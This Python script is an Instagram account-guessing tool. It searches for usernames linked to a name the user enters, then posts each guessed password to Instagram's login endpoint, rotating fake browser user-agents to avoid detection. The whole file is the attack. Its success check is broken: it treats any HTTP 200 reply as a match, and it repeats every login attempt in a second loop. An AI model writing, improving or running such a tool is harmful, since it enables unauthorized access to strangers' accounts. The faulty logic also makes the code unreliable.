import requests
import time
import random
from bs4 import BeautifulSoup

# Define a function to generate a random user-agent
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    ]
    return random.choice(user_agents)

def check_password(username, password):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {"User-Agent": random_user_agent()}
    data = {
        "username": username,
        "password": password,
        "queryParams": "eyJvZmZsaW5lX2lkIjoyNjQsImxhYmVsYXVzZV9uYW1lIjoidGVzdF91c2VyIn0%3D",
        "optIntoOneTap": "false"
    }
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200 and "authenticated":
        return True
    return False

def search_usernames(name):
    url = f"https://www.instagram.com/web/search/topsearch/?context=blended&query={name}"
    headers = {"User-Agent": random_user_agent()}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    usernames = []
    for div in soup.find_all("div", class_="fuqBx Nm9FW"):
        a = div.find("a")
        if a:
            usernames.append(a["href"].split("/")[-1])
    return usernames[:20]

def check_passwords(usernames, passwords):
    matched_accounts = []
    for username in usernames:
        for password in passwords:
            if check_password(username, password):
                matched_accounts.append((username, password))
                print(f"\033[92m{username}\033[0m: \033[92m{password}\033[0m")

            # Add a 1-second delay betweenrequests
            time.sleep(1)

    for username in usernames:
        found_match = False
        for password in passwords:
            if check_password(username, password):
                found_match = True
                break
        if not found_match:
            print(f"\033[91m{username}\033[0m: \033[91mNo Matching Password\033[0m")

    return matched_accounts

if __name__ == "__main__":
    name = input("Enter a name to search for related Instagram usernames: ")
    usernames = search_usernames(name)
    print(f"Related usernames: {usernames}")
    num_passwords = int(input("Enter the number of passwords to check: "))
    passwords = []
    for i in range(num_passwords):
        password = input(f"Enter password {i+1}: ")
        passwords.append(password)
    matched_accounts = check_passwords(usernames, passwords)
